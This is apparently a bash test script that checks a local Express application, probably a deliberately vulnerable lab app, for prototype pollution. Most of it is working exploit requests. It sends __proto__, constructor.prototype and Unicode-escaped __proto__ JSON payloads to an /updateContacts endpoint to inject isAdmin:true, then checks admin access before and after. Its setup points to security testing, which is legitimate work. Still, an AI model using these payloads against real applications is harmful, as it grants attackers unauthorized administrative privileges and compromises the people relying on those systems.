#!/bin/bash

# Color definitions for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default host and port - change if needed
HOST="localhost"
PORT="5003"

echo -e "${BLUE}=== EXPRESS PROTOTYPE POLLUTION TESTING SCRIPT ===${NC}\n"

# Check if we can reach the server
echo -e "${YELLOW}Testing server connection...${NC}"
curl -s "http://${HOST}:${PORT}/" > /dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}ERROR: Cannot connect to server at ${HOST}:${PORT}${NC}"
    echo "Please make sure the server is running and the HOST/PORT values are correct."
    exit 1
fi

echo -e "${GREEN}Server is reachable.${NC}\n"

# 1. Check initial vulnerability status
echo -e "${YELLOW}1. Checking current vulnerability status...${NC}"
curl -s "http://${HOST}:${PORT}/check-pollution" | json_pp

# 2. Check the simple test endpoint
echo -e "\n${YELLOW}2. Checking simple test endpoint...${NC}"
curl -s "http://${HOST}:${PORT}/test"

# 3. Test admin access before exploitation
echo -e "\n${YELLOW}3. Testing admin access before exploit...${NC}"
curl -s -X POST -H "Content-Type: application/json" -d '{}' "http://${HOST}:${PORT}/admin-check" | json_pp

# 4. Send the main exploit payload
echo -e "\n${YELLOW}4. Sending main exploit payload...${NC}"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"region_id":"exploit-test","name":"Exploit Test","__proto__":{"isAdmin":true,"isExploited":true}}' \
  "http://${HOST}:${PORT}/updateContacts" | json_pp

# 5. Check vulnerability status after exploit
echo -e "\n${YELLOW}5. Checking vulnerability status after exploit...${NC}"
curl -s "http://${HOST}:${PORT}/check-pollution" | json_pp

# 6. Check the simple test endpoint again
echo -e "\n${YELLOW}6. Checking simple test endpoint after exploit...${NC}"
curl -s "http://${HOST}:${PORT}/test"

# 7. Test admin access after exploitation
echo -e "\n${YELLOW}7. Testing admin access after exploit...${NC}"
curl -s -X POST -H "Content-Type: application/json" -d '{}' "http://${HOST}:${PORT}/admin-check" | json_pp

# 8. Alternative exploitation methods if the first one didn't work
echo -e "\n${YELLOW}8. Trying alternative exploitation method 1...${NC}"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"region_id":"exploit-alt1","name":"Alt Exploit 1","constructor":{"prototype":{"isAdmin":true,"isExploited":true}}}' \
  "http://${HOST}:${PORT}/updateContacts" | json_pp

echo -e "\n${YELLOW}9. Trying alternative exploitation method 2 (Unicode escape)...${NC}"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"region_id":"exploit-alt2","name":"Alt Exploit 2","__proto\u005f\u005f":{"isAdmin":true,"isExploited":true}}' \
  "http://${HOST}:${PORT}/updateContacts" | json_pp

echo -e "\n${YELLOW}10. Trying alternative exploitation method 3 (minimal payload)...${NC}"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"region_id":"exploit-alt3","__proto__":{"isAdmin":true,"isExploited":true}}' \
  "http://${HOST}:${PORT}/updateContacts" | json_pp

# 11. Final check of vulnerability status
echo -e "\n${YELLOW}11. Final check of vulnerability status...${NC}"
curl -s "http://${HOST}:${PORT}/check-pollution" | json_pp

# 12. If all fails, suggest the manual trigger (if added to the app)
echo -e "\n${YELLOW}12. If all previous attempts failed, you can try the manual trigger (if enabled in app.js)...${NC}"
echo -e "${BLUE}curl -s \"http://${HOST}:${PORT}/trigger-vulnerability\"${NC}"

echo -e "\n${BLUE}=== TESTING COMPLETE ===${NC}"
echo -e "If the server is still showing as not vulnerable, check the server logs for more information"
echo -e "and consider implementing the suggested app.js modifications."